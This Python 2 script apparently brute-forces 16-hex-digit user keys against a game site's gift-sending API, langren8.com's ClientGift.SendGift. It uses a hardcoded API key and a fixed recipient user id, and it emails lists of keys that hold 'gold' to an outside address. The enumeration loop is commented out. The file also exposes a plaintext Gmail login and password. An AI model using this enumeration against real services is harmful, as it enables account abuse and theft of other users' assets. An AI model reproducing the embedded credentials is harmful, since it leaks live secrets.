import urllib2
import smtplib
from email.mime.text import MIMEText
from datetime import *
#import uuid, time

hasGold=[]
noGold=[]
erroruk=[]

def sendEmail(uk,gold,n):
    user = "kennysun920@gmail.com"
    pwd = "sl19890920"
    emailFrom="kennysun920@gmail.com"
    emailTo = "yuyin-1989@163.com"
    emailSubject=gold
    data=';'.join(uk)
    
    msg = MIMEText(data)
    msg['Subject']=emailSubject+" num:%d"%n
    msg['To']=emailTo
    msg['From']=emailFrom
    mail = smtplib.SMTP("smtp.gmail.com",587)
    mail.starttls()
    mail.login(user,pwd)
    mail.sendmail(emailFrom,emailTo,msg.as_string())
    mail.quit()

def connect(uk,n):
    url="http://www.langren8.com/Service/Service.aspx?api_key=LJfi1j3MNfk1op23&method=ClientGift.SendGift&uk="+str(uk)+"&tuserid=261625&giftid=1"
    try:
        response=urllib2.urlopen(url)
        status=response.read()
        if not status:
            return
        if status=='true':
            hasGold.append(uk)
#            print '\n',uk
            try:
                sendEmail(hasGold,'hasGold',n)
                print "Successfully sent email"
            except smtplib.SMTPException:
                print "Error: unable to send email"
                
        elif status=='false':
            noGold.append(uk)
            try:
                sendEmail(noGold,'noGold',n)
                print "Successfully sent email"
            except smtplib.SMTPException:
                print "Error: unable to send email"
                
#            print '\n',uk
        else:
            print '\n',status,'\t',uk
            
    except urllib2.URLError,e:
        print e
        pass
    
if __name__ == '__main__':
#    n=0   
#    j1=16**15-1
#    j2=16**16-1
#    i=0xe07a613c867009e4
#    start=time.time()
#    while i<j2:
#        cfg=hex(i)
#        
#        if len(cfg)==19:
#            uk=str(cfg)[2:-1]
#        else:
#            uk=str(cfg)[2:]
#        if len(uk)<16:
#            continue
#        n=n+1
#        i=i+1
#        connect(uk,n)
#        if n%3000==0:
#            print "********************************************************************************"
#            print hex(i),'\t',time.time()-start
#            print "hasGold:\n",hasGold
#            print "noGold:\n",noGold
#            print "********************************************************************************"
#            break
#
#    end=time.time()
#    print '\nspan:'
#    print end-start
#    print "\nhasGold:\n",hasGold
#    print "noGold:\n",noGold
    urllib2.urlopen("http://www.langren8.com/api_key=LJfi1j3MNf")
    
    
    

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
